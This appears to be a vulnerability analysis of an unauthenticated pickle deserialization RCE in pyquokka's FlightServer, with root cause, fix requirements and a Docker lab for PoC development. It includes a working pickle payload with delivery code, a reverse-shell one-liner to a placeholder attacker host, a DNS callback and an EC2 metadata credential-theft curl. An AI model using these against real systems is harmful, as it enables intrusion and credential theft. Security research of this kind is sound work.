# Vulnerability Analysis: CVE-2025-62515

## Summary

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-62515 |
| **Vulnerability** | Insecure Deserialization via `pickle.loads()` in FlightServer |
| **Affected Software** | pyquokka ≤ 0.3.2 (all versions) |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **CVSS** | 9.8 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Status** | **UNPATCHED** — no fix commit exists |

---

## Root Cause

The `FlightServer` class in `pyquokka/flight.py` uses Python's `pickle.loads()` to deserialize data received directly from network clients over the Apache Arrow Flight (gRPC) protocol. There is **zero input validation, sanitization, or type restriction** on the data before it is passed to `pickle.loads()`.

Python's `pickle` module is fundamentally unsafe for untrusted input. The pickle protocol supports a `__reduce__()` dunder method that allows arbitrary callable invocation during deserialization. An attacker can craft a pickle payload whose `__reduce__()` method calls `os.system()`, `subprocess.Popen()`, or any other Python callable — achieving **arbitrary Remote Code Execution** on the server.

The root cause is the use of `pickle.loads()` on attacker-controlled input without:
1. Any authentication on the gRPC/Flight connection
2. Any allowlist/denylist of deserializable classes
3. Any signature verification or integrity check on the payload
4. Any sandboxing of the deserialization process

---

## Vulnerable File(s) and Function(s)

All vulnerabilities are in **`pyquokka/flight.py`** in the `FlightServer` class.

### Primary Target — `do_action()` method, "set_configs" action (Line 283)

```python
# flight.py line 275-289
def do_action(self, context, action):
    ...
    elif action.type == "set_configs":
        config_dict = pickle.loads(action.body.to_pybytes())   # <--- LINE 283: RCE HERE
        for key in config_dict:
            assert key in self.config_dict, "got an unrecognized Flight server config"
            ...
```

**Why this is the primary target:**
- The entire action body (`action.body.to_pybytes()`) is passed directly to `pickle.loads()`
- No preceding validation — pickle deserialization happens *before* the `assert key in self.config_dict` check
- The `__reduce__()` method fires during `pickle.loads()`, so code execution happens before any assertion
- No authentication required — any client connecting to the gRPC port can send actions

### Secondary Target — `do_action()` method, "cache_garbage_collect" action (Line 305)

```python
# flight.py line 303-305
elif action.type == "cache_garbage_collect":
    gcable = pickle.loads(action.body.to_pybytes())   # <--- LINE 305: RCE HERE
```

Identical vulnerability pattern. The action body is directly deserialized.

### Additional Vulnerable Sinks in `FlightServer`

| Line | Method | Sink | Input Source |
|------|--------|------|-------------|
| **46** | `do_put()` | `pickle.loads(key[1])` | Flight descriptor command bytes |
| **98** | `do_get()` | `pickle.loads(ticket.ticket)` | Flight ticket bytes |
| **220** | `do_get()` | `pickle.loads(input_requirements)` | Nested data within deserialized ticket |

All five sinks are network-reachable via the Apache Arrow Flight gRPC protocol.

---

## Triggering Input

### Minimal Malicious Pickle Payload

```python
import pickle
import os

class RCEPayload:
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned",))

malicious_bytes = pickle.dumps(RCEPayload())
```

When `pickle.loads(malicious_bytes)` is called, Python invokes `os.system("touch /tmp/pwned")` — achieving arbitrary command execution.

### Delivery Mechanism

The payload is sent as the body of an Apache Arrow Flight `Action` message:

```python
import pyarrow.flight

client = pyarrow.flight.connect("grpc://TARGET:5005")
action = pyarrow.flight.Action("set_configs", malicious_bytes)
results = list(client.do_action(action))
```

The gRPC transport handles all serialization/framing. The attacker only needs to:
1. Reach TCP port 5005 on the target
2. Send a valid Flight Action with type `"set_configs"` and the pickle payload as the body

---

## Attack Scenario

### Step-by-Step Exploitation

1. **Reconnaissance**: Attacker identifies a pyquokka deployment (port 5005/tcp open, gRPC service responding to Flight protocol)
2. **Payload Construction**: Attacker creates a malicious pickle object with `__reduce__()` that executes an arbitrary command (e.g., reverse shell, file write, data exfiltration)
3. **Connection**: Attacker uses `pyarrow.flight.connect("grpc://TARGET:5005")` — no authentication needed
4. **Delivery**: Attacker sends `client.do_action(Action("set_configs", malicious_pickle_bytes))`
5. **Execution**: Server-side `pickle.loads()` invokes the `__reduce__()` method, executing the attacker's code with the privileges of the pyquokka server process
6. **Post-Exploitation**: Attacker has full RCE — can install backdoors, exfiltrate data, pivot to other systems, etc.

### Attacker Profile

- **Remote, unauthenticated** — no credentials needed
- **Network access to port 5005** is the only prerequisite
- **Low complexity** — standard pickle RCE is a well-known technique
- **No user interaction** required

---

## Impact

**Remote Code Execution (RCE)** with the privileges of the pyquokka server process.

- **Confidentiality**: COMPLETE — attacker can read any data accessible to the process (environment variables, files, secrets, data lake contents)
- **Integrity**: COMPLETE — attacker can modify files, inject data into the data lake, alter configurations
- **Availability**: COMPLETE — attacker can kill the process, corrupt data, deploy ransomware
- **Scope**: The server typically runs as an unprivileged user, but post-exploitation can lead to privilege escalation via kernel exploits, credential theft, or lateral movement within the network. The pyquokka FlightServer often runs in cloud environments (EC2 instances) with IAM roles attached, potentially giving the attacker AWS API access.

---

## Authentication Requirements

**NONE.** The vulnerability is **pre-authentication**.

- The Apache Arrow Flight server has **no authentication middleware** configured
- The `FlightServer.__init__()` method passes no `auth_handler` to the base class
- The gRPC endpoint accepts anonymous connections
- No tokens, API keys, or session cookies are required
- The server binds to `0.0.0.0:5005` by default (all interfaces), making it accessible from any network that can reach the host

The PoC needs only `pyarrow` on the client side. A simple `pyarrow.flight.connect("grpc://TARGET:5005")` establishes a usable connection immediately.

---

## Fix Assessment

**There is no fix.** The vulnerability is **UNPATCHED** as of the latest version (0.3.2) and latest commit in the repository.

- No commit in the git history addresses the `pickle.loads()` usage
- No authentication has been added to the FlightServer
- No safe deserialization alternatives (e.g., `json.loads()`, Arrow IPC, protobuf) have been implemented
- The advisory (GHSA-f74j-gffq-vm9p) was published but no remediation was committed

### What a Proper Fix Would Require

1. **Replace `pickle.loads()` with a safe serialization format** (JSON, Arrow IPC, protobuf) for all five vulnerable sinks
2. **Add authentication** to the FlightServer (e.g., `FlightServerBase` supports `auth_handler` parameter)
3. **Bind to localhost by default** instead of `0.0.0.0`
4. If pickle must be used for internal data (e.g., between trusted cluster nodes), implement a restricted unpickler that only allows specific safe types

Since the vulnerability is unpatched, fix bypass analysis is not applicable. The vulnerability is exploitable against all deployed versions.

---

## Potential Bypass Vectors

Not applicable — there is no fix to bypass.

However, for completeness, if a partial fix were applied (e.g., only fixing `set_configs`), the attacker could use any of the other four `pickle.loads()` sinks:
- `cache_garbage_collect` action (line 305)
- `do_put` descriptor (line 46)
- `do_get` ticket (line 98)
- `do_get` input_requirements (line 220)

---

## Escalation Path

The vulnerability directly provides **Remote Code Execution** — there is no need for escalation from a weaker primitive. The `pickle.loads()` → `__reduce__()` chain gives arbitrary Python code execution, which translates directly to OS command execution via `os.system()`, `subprocess.Popen()`, etc.

Further escalation from the initial RCE:
- **Cloud metadata access**: If running on EC2, `curl http://169.254.169.254/latest/meta-data/iam/` can steal IAM credentials
- **Lateral movement**: The pyquokka cluster connects to Redis (port 6800) and other worker nodes; these can be compromised
- **Data lake access**: The server has access to S3 buckets and DuckDB databases configured in the Quokka context

---

## Related Attack Surface

The entire codebase is pervasive with `pickle.loads()` usage. Beyond the 5 sinks in `flight.py`, there are additional deserializations in:

### `pyquokka/core.py` — Worker Executor

Multiple `pickle.loads()` calls on data retrieved from Redis:
- **Line 125**: `actor, channel = pickle.loads(key)` — deserializing Redis keys
- **Line 513**: `task_type, tup = pickle.loads(candidate_task)` — deserializing task objects from Redis
- **Line 577**: `name, format = pickle.loads(metadata)` — deserializing metadata from Flight responses
- **Line 935**: `input_object = pickle.loads(self.LT.get(self.r, ...))` — deserializing from LineageTable

These are exploitable if an attacker can write to the Redis instance (which listens on port 6800 with `protected-mode no` per `redis.conf`).

### `pyquokka/coordinator.py` — Cluster Coordinator

- **Line 56**: `pickle.loads(result.body.to_pybytes())` — deserializing Flight response
- **Line 213**: `pickle.loads(x)` in list comprehension — deserializing checkpoint sequences from Redis
- **Line 281**: `pickle.loads(object)` — deserializing task objects
- **Line 358**: `pickle.loads(...)` — deserializing input requirement tables from Redis

### `pyquokka/tables.py` — Redis Table Abstractions

- **Lines 111-339**: Approximately 15 `pickle.loads()` calls deserializing Redis keys and values throughout various table class methods. If the Redis instance is compromised (unauth on port 6800), all these become RCE vectors.

### `pyquokka/debugger.py`

- **Line 39**: `pickle.loads(result.body.to_pybytes())` — deserializes Flight server response data

### Summary: The `pickle.loads()` pattern is endemic to the codebase. The FlightServer (port 5005) is the most direct network-reachable sink, but the unprotected Redis instance (port 6800) represents a parallel attack surface for the same vulnerability class.

---

## Build System

| Field | Value |
|---|---|
| **Build System** | setuptools (`setup.py`) |
| **Language** | Python 3 |
| **Install Command** | `pip install pyquokka==0.3.1` or `pip install .` from source |
| **Package Manager** | pip / PyPI |

---

## Build Commands

### Install from PyPI (simplest — recommended for lab)
```bash
pip install pyquokka==0.3.1
```

### Install from source (current checkout)
```bash
cd ./source
pip install .
```

### Minimal install for PoC (skip heavy dependencies)

For the **server** (target), a minimal install that provides the FlightServer:
```bash
pip install pyarrow polars psutil
```
Then run `flight.py` directly — it only imports `pyarrow`, `polars`, `psutil`, `pickle` (stdlib), `threading`, `time`, `os`, and `multiprocessing`.

For the **client** (attacker), only `pyarrow` is needed:
```bash
pip install pyarrow
```

---

## Dependencies

### Server-side (target) — Full pyquokka install
| Package | Version | Purpose |
|---------|---------|---------|
| pyarrow | any | Apache Arrow Flight server (gRPC transport) |
| polars | ≥0.17.0 | DataFrame operations in FlightServer |
| psutil | any | Memory monitoring in `check_puttable` |
| ray | ≥2.0.0 | Distributed computing (not needed for standalone FlightServer) |
| redis | any | State storage (not needed for standalone FlightServer) |
| duckdb | ≥0.6.0 | SQL engine (not needed for standalone FlightServer) |
| boto3 | any | AWS SDK (not needed for standalone FlightServer) |
| numpy | any | Numerical ops |
| pandas | any | DataFrames |
| protobuf | any | Serialization |
| sqlglot | ≥11.4.2 | SQL parsing |
| graphviz | any | Graph rendering |
| tqdm | any | Progress bars |

### Server-side — Minimal for PoC (standalone FlightServer only)
| Package | Version | Purpose |
|---------|---------|---------|
| pyarrow | any | Flight server framework |
| polars | ≥0.17.0 | Used in FlightServer data handling |
| psutil | any | Used in `check_puttable` action |

### Client-side (attacker)
| Package | Version | Purpose |
|---------|---------|---------|
| pyarrow | any | Flight client for sending exploit payload |

---

## Runtime Requirements

### Network
- **Port 5005/tcp** — FlightServer (gRPC, Apache Arrow Flight protocol)
- Server binds to `0.0.0.0` by default (all interfaces)
- No TLS/SSL configured by default (plaintext gRPC)

### Services
- For standalone FlightServer PoC: **No additional services needed**
  - Redis is NOT required for the FlightServer to start and accept connections
  - Ray is NOT required for the FlightServer standalone mode
- The FlightServer can be started with: `python -c "from pyquokka.flight import FlightServer; FlightServer('0.0.0.0', location='grpc+tcp://0.0.0.0:5005').serve()"` or simply `python pyquokka/flight.py`

### Docker Lab Recommendations

**Base image**: `python:3.10-slim` or `python:3.11-slim` (Debian-based, small footprint)

**Server container**:
```dockerfile
FROM python:3.10-slim
RUN pip install pyarrow polars psutil
COPY flight.py /app/flight.py
EXPOSE 5005
CMD ["python", "/app/flight.py"]
```

Or with full pyquokka install:
```dockerfile
FROM python:3.10-slim
RUN pip install pyquokka==0.3.1
CMD ["python", "-c", "from pyquokka.flight import FlightServer; FlightServer('0.0.0.0', location='grpc+tcp://0.0.0.0:5005').serve()"]
```

**Client container** (or run from host):
```dockerfile
FROM python:3.10-slim
RUN pip install pyarrow
```

**docker-compose.yml sketch**:
```yaml
services:
  target:
    build: ./server
    ports:
      - "5005:5005"
  attacker:
    build: ./client
    depends_on:
      - target
```

### Configuration
- No configuration files needed for the FlightServer standalone
- No environment variables required
- No database setup needed
- The server starts accepting connections immediately upon `serve()`

---

## PoC Development Notes

### Simplest Exploit Vector: `set_configs` Action

1. The `set_configs` action directly deserializes the full action body with `pickle.loads()`
2. Code execution happens **inside** `pickle.loads()` — before any validation
3. The server will likely crash or raise an assertion error after RCE (since the deserialized object won't be a valid config dict), but the command will have already executed

### Verification Strategy

- **File creation**: `os.system("touch /tmp/pwned")` — check if `/tmp/pwned` exists in the server container
- **Command output capture**: `os.system("id > /tmp/rce_output")` — read the file back
- **Reverse shell** (advanced): `os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'")` — catch with netcat
- **DNS callback**: `os.system("nslookup UNIQUE.attacker.com")` — detect via DNS log

### Expected Server Behavior After Exploit

After the `pickle.loads()` call triggers RCE, the server will attempt to iterate the deserialized object as a dict. If the payload's `__reduce__` returns something that isn't a dict (e.g., the return value of `os.system()` is an int), the server will raise a `TypeError` or `AssertionError`. This does **not** crash the gRPC server — the exception is caught by the Arrow Flight framework and returned as a gRPC error to the client. The server continues running and remains exploitable for follow-up payloads.

### Alternative Vectors (if `set_configs` is blocked)

1. **`cache_garbage_collect` action** (line 305) — identical pattern, same ease of exploitation
2. **`do_put`** (line 46) — requires constructing a valid Flight descriptor with pickle in the command field
3. **`do_get`** (line 98) — requires constructing a valid Flight ticket with pickle payload
4. **`do_get` nested** (line 220) — two-stage deserialization; outer `pickle.loads` at line 98 must produce valid tuple structure, inner `pickle.loads` at line 220 fires when `exact=True`
